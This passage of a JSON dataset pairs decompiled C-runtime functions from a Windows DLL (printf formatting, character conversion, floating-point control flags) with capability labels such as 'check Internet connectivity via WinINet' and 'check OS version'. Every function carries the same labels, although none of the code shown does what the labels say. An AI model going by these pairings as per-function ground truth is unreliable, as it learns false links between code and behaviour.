        "decompiled_code": "\nuint64_t fcn.18000f2a4(int64_t arg1)\n\n{\n    int32_t *arg4;\n    int64_t arg1_00;\n    char cVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    ulong uVar5;\n    ushort *arg2;\n    uchar uVar6;\n    uint32_t uVar7;\n    int64_t arg3;\n    ushort uStackX8;\n    uchar uStackX10;\n    \n    cVar1 = *(arg1 + 0x41);\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    uVar6 = 0x78;\n    if (cVar1 < 'e') {\n        if (cVar1 == 'd') {\ncode_r0x00018000f397:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x00018000f39b:\n            uVar5 = 10;\ncode_r0x00018000f3a3:\n            uVar4 = fcn.18000fe44(arg1, uVar5);\n        }\n        else {\n            if (cVar1 == 'A') goto code_r0x00018000f3aa;\n            if (cVar1 == 'C') {\ncode_r0x00018000f315:\n                uVar4 = fcn.18000fcd4(arg1);\n            }\n            else {\n                if (cVar1 < 'E') goto code_r0x00018000f3b3;\n                if (cVar1 < 'H') goto code_r0x00018000f3aa;\n                if (cVar1 == 'S') {\ncode_r0x00018000f353:\n                    uVar4 = fcn.1800101d4(arg1);\n                }\n                else {\n                    if (cVar1 == 'X') goto code_r0x00018000f368;\n                    if (cVar1 != 'Z') {\n                        if (cVar1 != 'a') {\n                            if (cVar1 != 'c') goto code_r0x00018000f3b3;\n                            goto code_r0x00018000f315;\n                        }\n                        goto code_r0x00018000f3aa;\n                    }\n                    uVar4 = fcn.18000f848(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if ('g' < cVar1) {\n            if (cVar1 == 'i') goto code_r0x00018000f397;\n            if (cVar1 == 'n') {\n                uVar4 = fcn.18001014c(arg1);\n                goto code_r0x00018000f3af;\n            }\n            if (cVar1 == 'o') {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                uVar5 = 8;\n            }\n            else if (cVar1 == 'p') {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x00018000f368:\n                uVar5 = 0x10;\n            }\n            else {\n                if (cVar1 == 's') goto code_r0x00018000f353;\n                if (cVar1 == 'u') goto code_r0x00018000f39b;\n                if (cVar1 != 'x') goto code_r0x00018000f3b3;\n                uVar5 = 0x10;\n            }\n            goto code_r0x00018000f3a3;\n        }\ncode_r0x00018000f3aa:\n        uVar4 = fcn.18000f938(arg1);\n    }\ncode_r0x00018000f3af:\n    if (uVar4 == '\\0') {\ncode_r0x00018000f3b3:\n        return uVar4 & 0xffffffffffffff00;\n    }\n    if (*(arg1 + 0x40) != '\\0') goto code_r0x00018000f4ee;\n    uVar2 = *(arg1 + 0x30);\n    uStackX8 = 0;\n    arg3 = 0;\n    uStackX10 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) == 0) goto code_r0x00018000f40c;\n                uStackX8 = 0x20;\n            }\n            else {\n                uStackX8 = 0x2b;\n            }\n        }\n        else {\n            uStackX8 = 0x2d;\n        }\n        arg3 = 1;\n    }\ncode_r0x00018000f40c:\n    cVar1 = *(arg1 + 0x41);\n    if (((cVar1 + 0xa8U & 0xdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((cVar1 + 0xbfU & 0xdf) == 0)) {\n        *(&uStackX8 + arg3) = 0x30;\n        if ((cVar1 == 'X') || (cVar1 == 'A')) {\n            uVar6 = 0x58;\n        }\n        *(&uStackX8 + arg3 + 1) = uVar6;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar7 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.18000e6b4(arg1_00, CONCAT71(uVar2 >> 8, 0x20), uVar7, arg4);\n    }\n    arg2 = &uStackX8;\n    fcn.1800104f8(arg1_00, arg2, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.18000e6b4(arg1_00, CONCAT71(arg2 >> 8, 0x30), uVar7, arg4);\n    }\n    uVar5 = 0;\n    uVar4 = fcn.180010334(arg1);\n    if ((-1 < *arg4) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        uVar4 = fcn.18000e6b4(arg1_00, CONCAT71(uVar5 >> 8, 0x20), uVar7, arg4);\n    }\ncode_r0x00018000f4ee:\n    return uVar4 & 0xffffffffffffff00 | 1;\n}\n",
        "token_count": 1673
    },
    "18000f11": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.18000f110(uint8_t *arg1)\n\n{\n    uint8_t *arg4;\n    uint8_t *arg1_00;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    char cVar4;\n    uint16_t uVar5;\n    uint *puVar6;\n    int16_t *piVar7;\n    uint64_t uVar8;\n    ulong arg2;\n    uchar *arg2_00;\n    uint32_t uVar9;\n    ushort uVar10;\n    int64_t arg3;\n    uchar auStack104 [32];\n    uint8_t *puStack72;\n    uint uStack56;\n    ushort uStack52;\n    uint64_t uStack48;\n    \n    uVar5 = *(arg1 + 0x42);\n    piVar7 = uVar5;\n    if (uVar5 != 0x46) {\n        if (uVar5 == 0x4e) {\n            if ((*arg1 & 8) != 0) goto code_r0x00018000f29c;\n            *(arg1 + 0x2c) = 8;\n        }\n        else if (*(arg1 + 0x3c) == 0) {\n            if (uVar5 == 0x49) {\n                piVar7 = *(arg1 + 0x18);\n                iVar1 = *piVar7;\n                if ((iVar1 == 0x33) && (piVar7[1] == 0x32)) {\n                    piVar7 = piVar7 + 2;\n                    *(arg1 + 0x3c) = 10;\n                    *(arg1 + 0x18) = piVar7;\n                }\n                else if ((iVar1 == 0x36) && (piVar7[1] == 0x34)) {\n                    piVar7 = piVar7 + 2;\n                    *(arg1 + 0x3c) = 0xb;\n                    *(arg1 + 0x18) = piVar7;\n                }\n                else {\n                    piVar7 = iVar1 - 0x58U;\n                    if ((iVar1 - 0x58U < 0x21) && ((0x120821001U >> (piVar7 & 0x3f) & 1) != 0)) {\n                        *(arg1 + 0x3c) = 9;\n                    }\n                }\n            }\n            else if (uVar5 == 0x4c) {\n                *(arg1 + 0x3c) = 8;\n            }\n            else if (uVar5 == 0x54) {\n                *(arg1 + 0x3c) = 0xd;\n            }\n            else {\n                if (uVar5 == 0x68) {\n                    if (**(arg1 + 0x18) == 0x68) {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        piVar7 = 0x1;\n                    }\n                    else {\n                        piVar7 = 0x2;\n                    }\n                }\n                else {\n                    if (uVar5 == 0x6a) {\n                        *(arg1 + 0x3c) = 5;\n                        goto code_r0x00018000f29c;\n                    }\n                    if (uVar5 != 0x6c) {\n                        if (uVar5 == 0x74) {\n                            *(arg1 + 0x3c) = 7;\n                        }\n                        else if (uVar5 == 0x77) {\n                            *(arg1 + 0x3c) = 0xc;\n                        }\n                        else if (uVar5 == 0x7a) {\n                            *(arg1 + 0x3c) = 6;\n                        }\n                        goto code_r0x00018000f29c;\n                    }\n                    if (**(arg1 + 0x18) == 0x6c) {\n                        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n                        piVar7 = 0x4;\n                    }\n                    else {\n                        piVar7 = 0x3;\n                    }\n                }\n                *(arg1 + 0x3c) = piVar7;\n            }\ncode_r0x00018000f29c:\n            return CONCAT71(piVar7 >> 8, 1);\n        }\n        uStack48 = 0x18000f152;\n        puVar6 = fcn.18001293c();\n        *puVar6 = 0x16;\n        uStack48 = 0x18000f15d;\n        uVar8 = fcn.18001097c();\n        return uVar8 & 0xffffffffffffff00;\n    }\n    if ((*arg1 & 8) != 0) goto code_r0x00018000f29c;\n    *(arg1 + 0x2c) = 7;\n    uStack48 = *0x18002b028 ^ &stack0xffffffffffffff98;\n    uVar5 = *(arg1 + 0x42);\n    uVar10 = 0x78;\n    if (uVar5 < 0x65) {\n        if (uVar5 == 100) {\ncode_r0x00018000f633:\n            *(arg1 + 0x30) = *(arg1 + 0x30) | 0x10;\ncode_r0x00018000f637:\n            arg2 = 10;\ncode_r0x00018000f63f:\n            cVar4 = fcn.18000ffc4(arg1, arg2);\n        }\n        else {\n            if (uVar5 == 0x41) goto code_r0x00018000f646;\n            if (uVar5 == 0x43) {\ncode_r0x00018000f59f:\n                cVar4 = fcn.18000fd9c(arg1);\n            }\n            else {\n                if (uVar5 < 0x45) goto code_r0x00018000f7ab;\n                if (uVar5 < 0x48) goto code_r0x00018000f646;\n                if (uVar5 == 0x53) {\ncode_r0x00018000f5ef:\n                    cVar4 = fcn.18001026c(arg1);\n                }\n                else {\n                    if (uVar5 == 0x58) goto code_r0x00018000f604;\n                    if (uVar5 != 0x5a) {\n                        if (uVar5 != 0x61) {\n                            if (uVar5 != 99) goto code_r0x00018000f7ab;\n                            goto code_r0x00018000f59f;\n                        }\n                        goto code_r0x00018000f646;\n                    }\n                    cVar4 = fcn.18000f8bc(arg1);\n                }\n            }\n        }\n    }\n    else {\n        if (0x67 < uVar5) {\n            if (uVar5 == 0x69) goto code_r0x00018000f633;\n            if (uVar5 == 0x6e) {\n                cVar4 = fcn.18001014c(arg1);\n                goto code_r0x00018000f64b;\n            }\n            if (uVar5 == 0x6f) {\n                if ((*(arg1 + 0x30) >> 5 & 1) != 0) {\n                    *(arg1 + 0x30) = *(arg1 + 0x30) | 0x80;\n                }\n                arg2 = 8;\n            }\n            else if (uVar5 == 0x70) {\n                *(arg1 + 0x38) = 0x10;\n                *(arg1 + 0x3c) = 0xb;\ncode_r0x00018000f604:\n                arg2 = 0x10;\n            }\n            else {\n                if (uVar5 == 0x73) goto code_r0x00018000f5ef;\n                if (uVar5 == 0x75) goto code_r0x00018000f637;\n                if (uVar5 != 0x78) goto code_r0x00018000f7ab;\n                arg2 = 0x10;\n            }\n            goto code_r0x00018000f63f;\n        }\ncode_r0x00018000f646:\n        cVar4 = fcn.18000faf4(arg1);\n    }\ncode_r0x00018000f64b:\n    if ((cVar4 == '\\0') || (arg1[0x40] != 0)) goto code_r0x00018000f7ab;\n    uVar2 = *(arg1 + 0x30);\n    uStack56 = 0;\n    uStack52 = 0;\n    arg3 = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    uStack56 = 0x20;\n                    arg3 = 1;\n                }\n                goto code_r0x00018000f6b0;\n            }\n            uVar5 = 0x2b;\n        }\n        else {\n            uVar5 = 0x2d;\n        }\n        uStack56 = uVar5;\n        arg3 = 1;\n    }\ncode_r0x00018000f6b0:\n    iVar1 = *(arg1 + 0x42);\n    if (((iVar1 - 0x58U & 0xffdf) == 0) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar3) || ((iVar1 - 0x41U & 0xffdf) == 0)) {\n        *(&stack0xffffffffffffffc8 + arg3 * 2) = 0x30;\n        if ((iVar1 == 0x58) || (iVar1 == 0x41)) {\n            uVar10 = 0x58;\n        }\n        *(&stack0xffffffffffffffca + arg3 * 2) = uVar10;\n        arg3 = arg3 + 2;\n    }\n    arg4 = arg1 + 0x28;\n    arg1_00 = arg1 + 0x468;\n    uVar9 = (*(arg1 + 0x34) - *(arg1 + 0x50)) - arg3;\n    if ((uVar2 & 0xc) == 0) {\n        fcn.18000e72c(arg1_00, uVar2 & 0xffffff00 | 0x20, uVar9, arg4);\n    }\n    puStack72 = arg1 + 0x10;\n    arg2_00 = &stack0xffffffffffffffc8;\n    fcn.18001059c(arg1_00, arg2_00, arg3, arg4);\n    if (((*(arg1 + 0x30) >> 3 & 1) != 0) && ((*(arg1 + 0x30) >> 2 & 1) == 0)) {\n        fcn.18000e72c(arg1_00, arg2_00 & 0xffffffffffffff00 | 0x30, uVar9, arg4);\n    }\n    uVar8 = 0;\n    fcn.180010410(arg1);\n    if ((-1 < *(arg1 + 0x28)) && ((*(arg1 + 0x30) >> 2 & 1) != 0)) {\n        fcn.18000e72c(arg1_00, uVar8 & 0xffffffffffffff00 | 0x20, uVar9, arg1 + 0x28);\n    }\ncode_r0x00018000f7ab:\n    uVar8 = fcn.18001dd90(uStack48 ^ &stack0xffffffffffffff98);\n    return uVar8;\n}\n",
        "token_count": 2705
    },
    "18000fe4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.18000fe44(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = fcn.18000f7e0(*(arg1 + 0x3c));\n    if (iVar1 == 1) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar1 == 4) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else {\n        if (iVar1 != 8) {\n            puVar2 = fcn.18001293c();\n            *puVar2 = 0x16;\n            uVar3 = fcn.18001097c();\n            return uVar3 & 0xffffffffffffff00;\n        }\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        uVar3 = *(*(arg1 + 0x20) + -8);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar4 = uVar4 | 0x40;\n        *(arg1 + 0x30) = uVar4;\n    }\n    if (*(arg1 + 0x38) < 0) {\n        *(arg1 + 0x38) = 1;\n    }\n    else {\n        *(arg1 + 0x30) = uVar4 & 0xfffffff7;\n        fcn.18000e2c0(arg1 + 0x58, *(arg1 + 0x38));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) & 0xffffffdf;\n    }\n    *(arg1 + 0x54) = 0;\n    if (iVar1 == 8) {\n        fcn.18000e580(arg1, uVar3, arg2);\n    }\n    else {\n        fcn.18000e454(arg1, uVar3 & 0xffffffff, arg2);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 7 & 1) != 0) && ((*(arg1 + 0x50) == 0 || (**(arg1 + 0x48) != '0')))) {\n        *(arg1 + 0x48) = *(arg1 + 0x48) + -1;\n        **(arg1 + 0x48) = 0x30;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    return CONCAT71(uVar4 >> 0xf, 1);\n}\n",
        "token_count": 924
    },
    "18000ffc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.18000ffc4(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    uint *puVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    \n    iVar1 = fcn.18000f7e0(*(arg1 + 0x3c));\n    if (iVar1 == 1) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar1 == 4) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar3 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else {\n        if (iVar1 != 8) {\n            puVar2 = fcn.18001293c();\n            *puVar2 = 0x16;\n            uVar3 = fcn.18001097c();\n            return uVar3 & 0xffffffffffffff00;\n        }\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        uVar3 = *(*(arg1 + 0x20) + -8);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 4 & 1) != 0) && (uVar3 < 0)) {\n        uVar3 = -uVar3;\n        uVar4 = uVar4 | 0x40;\n        *(arg1 + 0x30) = uVar4;\n    }\n    if (*(arg1 + 0x38) < 0) {\n        *(arg1 + 0x38) = 1;\n    }\n    else {\n        *(arg1 + 0x30) = uVar4 & 0xfffffff7;\n        fcn.18000e368(arg1 + 0x58, *(arg1 + 0x38));\n    }\n    if (uVar3 == 0) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) & 0xffffffdf;\n    }\n    *(arg1 + 0x54) = 1;\n    if (iVar1 == 8) {\n        fcn.18000e610(arg1, uVar3, arg2);\n    }\n    else {\n        fcn.18000e4dc(arg1, uVar3 & 0xffffffff, arg2);\n    }\n    uVar4 = *(arg1 + 0x30) >> 7;\n    uVar3 = uVar4;\n    if (((uVar4 & 1) != 0) && ((uVar3 = 0,  *(arg1 + 0x50) == 0 || (**(arg1 + 0x48) != 0x30)))) {\n        *(arg1 + 0x48) = *(arg1 + 0x48) + -2;\n        **(arg1 + 0x48) = 0x30;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    return CONCAT71(uVar3 >> 8, 1);\n}\n",
        "token_count": 941
    },
    "180010e9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180010d4d)\n// WARNING: Removing unreachable block (ram,0x000180010d5a)\n// WARNING: Removing unreachable block (ram,0x000180010d64)\n// WARNING: Removing unreachable block (ram,0x000180010d73)\n// WARNING: Removing unreachable block (ram,0x000180010d7e)\n// WARNING: Removing unreachable block (ram,0x000180010d87)\n// WARNING: Removing unreachable block (ram,0x000180010d90)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180010e9c(void)\n\n{\n    code *pcVar1;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong var_28h;\n    uchar var_30h [4];\n    ulong var_2ch;\n    uint *var_20h;\n    int32_t *var_bp_18h;\n    ulong *var_bp_10h;\n    \n    aiStackX24[0] = 1;\n    auStackX16[0] = 0;\n    var_20h = auStackX16;\n    var_28h._0_1_ = 0;\n    var_bp_18h = aiStackX24;\n    var_bp_10h = &var_28h;\n    var_2ch._0_4_ = 2;\n    var_2ch._4_4_ = 2;\n    fcn.180010c28(var_30h, &var_2ch + 4, &var_20h, &var_2ch);\n    if (aiStackX24[0] == 0) {\n        fcn.180010dec(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 410
    },
    "180011c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.180011c30(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    bool bVar4;\n    \n    piVar3 = 0x180020930;\n    do {\n        if ((*piVar3 != 0) && (cVar1 = (**0x18001f2c8)(),  cVar1 == '\\0')) break;\n        piVar3 = piVar3 + 2;\n    } while (piVar3 != 0x180020a30);\n    if (piVar3 == 0x180020a30) {\n        uVar2 = 1;\n    }\n    else {\n        if (piVar3 != 0x180020930) {\n            piVar3 = piVar3 + -1;\n            do {\n                if ((piVar3[-1] != 0) && (*piVar3 != 0)) {\n                    (**0x18001f2c8)(0);\n                }\n                bVar4 = piVar3 != 0x180020938;\n                piVar3 = piVar3 + -2;\n            } while (bVar4);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 272
    },
    "180013bb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.180013bb0(void)\n\n{\n    char acStackX8 [8];\n    ulong var_18h_2;\n    ulong var_20h;\n    ulong var_28h;\n    ulong var_20h_2;\n    ulong *var_18h;\n    char *var_10h;\n    ulong *var_bp_8h;\n    \n    acStackX8[0] = '\\x01';\n    var_28h._0_4_ = 0;\n    var_18h = &var_28h;\n    var_20h._0_4_ = 0;\n    var_10h = acStackX8;\n    var_bp_8h = &var_20h;\n    var_20h_2._0_4_ = 8;\n    var_20h_2._4_4_ = 8;\n    fcn.1800139a8(&var_18h_2, &var_20h_2 + 4, &var_18h, &var_20h_2);\n    if (acStackX8[0] != '\\0') {\n        var_20h._0_4_ = var_28h;\n    }\n    return var_20h;\n}\n",
        "token_count": 281
    },
    "180013d7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.180013d78(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int64_t iStack40;\n    int64_t aiStack32 [2];\n    char cStack16;\n    \n    if ((arg2 == NULL) || (arg3 == 0)) {\n        *0x18002c2d0 = 0;\n        return 0;\n    }\n    if (*arg2 == 0) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        *arg1 = 0;\n        return 0;\n    }\n    fcn.18000daa0(&iStack40, arg4);\n    if (*(aiStack32[0] + 0xc) == 0xfde9) {\n        iVar1 = fcn.180019980(arg1);\n        if (iVar1 < 0) {\n            iVar1 = -1;\n        }\n        goto code_r0x000180013e15;\n    }\n    if (*(aiStack32[0] + 0x138) == 0) {\n        if (arg1 != NULL) {\n            *arg1 = *arg2;\n        }\ncode_r0x000180013e10:\n        iVar1 = 1;\n    }\n    else {\n        iVar1 = fcn.180019934(*arg2, aiStack32);\n        if (iVar1 == 0) {\n            iVar1 = fcn.180016bbc(*(aiStack32[0] + 0xc), 9);\n            if (iVar1 != 0) goto code_r0x000180013e10;\n        }\n        else if ((((1 < *(aiStack32[0] + 8)) && (*(aiStack32[0] + 8) <= arg3)) &&\n                 (iVar1 = fcn.180016bbc(*(aiStack32[0] + 0xc), 9),  iVar1 != 0)) ||\n                ((*(aiStack32[0] + 8) <= arg3 && (arg2[1] != 0)))) {\n            iVar1 = *(aiStack32[0] + 8);\n            goto code_r0x000180013e15;\n        }\n        puVar2 = fcn.18001293c();\n        iVar1 = -1;\n        *puVar2 = 0x2a;\n    }\ncode_r0x000180013e15:\n    if (cStack16 != '\\0') {\n        *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n        return iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 601
    },
    "18001be0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * fcn.18001be08(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar1 = fcn.18001293c();\n        *puVar1 = 0x16;\n        fcn.18001097c();\n    }\n    else if (arg1 < arg2) {\n        fcn.18000daa0(aiStack40, 0);\n        puVar2 = arg2 + -1;\n        if (*(iStack24 + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg1) break;\n            } while ((*(*puVar2 + 0x19 + iStack24) & 4) != 0);\n            puVar2 = arg2 + (-1 - (arg2 - puVar2 & 1));\n        }\n        if (cStack16 == '\\0') {\n            return puVar2;\n        }\n        *(aiStack40[0] + 0x3a8) = *(aiStack40[0] + 0x3a8) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 319
    },
    "18001d20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.18001d200(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint64_t arg1_00;\n    uint32_t uVar3;\n    \n    uVar1 = fcn.18001d870();\n    uVar3 = uVar1 >> 3 & 0x10;\n    uVar2 = uVar3 | 8;\n    if ((uVar1 & 0x200) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar2 | 4;\n    if ((uVar1 & 0x400) == 0) {\n        uVar3 = uVar2;\n    }\n    uVar2 = uVar3 | 2;\n    if ((uVar1 & 0x800) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar2 | 1;\n    if ((uVar1 & 0x1000) == 0) {\n        uVar3 = uVar2;\n    }\n    uVar2 = uVar3 | 0x80000;\n    if ((uVar1 & 0x100) == 0) {\n        uVar2 = uVar3;\n    }\n    uVar3 = uVar1 & 0x6000;\n    if (uVar3 != 0) {\n        if (uVar3 == 0x2000) {\n            uVar2 = uVar2 | 0x100;\n        }\n        else if (uVar3 == 0x4000) {\n            uVar2 = uVar2 | 0x200;\n        }\n        else if (uVar3 == 0x6000) {\n            uVar2 = uVar2 | 0x300;\n        }\n    }\n    uVar1 = uVar1 & 0x8040;\n    if (uVar1 == 0x40) {\n        uVar2 = uVar2 | 0x2000000;\n    }\n    else if (uVar1 == 0x8000) {\n        uVar2 = uVar2 | 0x3000000;\n    }\n    else if (uVar1 == 0x8040) {\n        uVar2 = uVar2 | 0x1000000;\n    }\n    uVar1 = ~(arg2 & 0x308031f) & uVar2 | arg1 & arg2 & 0x308031f;\n    if (uVar1 != uVar2) {\n        uVar3 = (uVar1 & 0x10) << 3;\n        uVar2 = uVar3 | 0x200;\n        if ((uVar1 & 8) == 0) {\n            uVar2 = uVar3;\n        }\n        uVar3 = uVar2 | 0x400;\n        if ((uVar1 & 4) == 0) {\n            uVar3 = uVar2;\n        }\n        uVar2 = uVar3 | 0x800;\n        if ((uVar1 & 2) == 0) {\n            uVar2 = uVar3;\n        }\n        uVar3 = uVar2 | 0x1000;\n        if ((uVar1 & 1) == 0) {\n            uVar3 = uVar2;\n        }\n        uVar2 = uVar3 | 0x100;\n        if ((uVar1 & 0x80000) == 0) {\n            uVar2 = uVar3;\n        }\n        arg1_00 = uVar2;\n        uVar3 = uVar1 & 0x300;\n        if (uVar3 != 0) {\n            if (uVar3 == 0x100) {\n                arg1_00 = uVar2 | 0x2000;\n            }\n            else if (uVar3 == 0x200) {\n                arg1_00 = uVar2 | 0x4000;\n            }\n            else if (uVar3 == 0x300) {\n                arg1_00 = uVar2 | 0x6000;\n            }\n        }\n        uVar1 = uVar1 & 0x3000000;\n        uVar2 = arg1_00;\n        if (uVar1 == 0x1000000) {\n            arg1_00 = uVar2 | 0x8040;\n        }\n        else if (uVar1 == 0x2000000) {\n            arg1_00 = uVar2 | 0x40;\n        }\n        else if (uVar1 == 0x3000000) {\n            arg1_00 = uVar2 | 0x8000;\n        }\n        if ((*0x18002b9e8 == '\\0') || ((arg1_00 & 0x40) == 0)) {\n            arg1_00 = arg1_00 & 0xffffffbf;\n            fcn.18001d880(arg1_00);\n        }\n        else {\n            fcn.18001d880(arg1_00);\n        }\n        uVar1 = arg1_00 >> 3 & 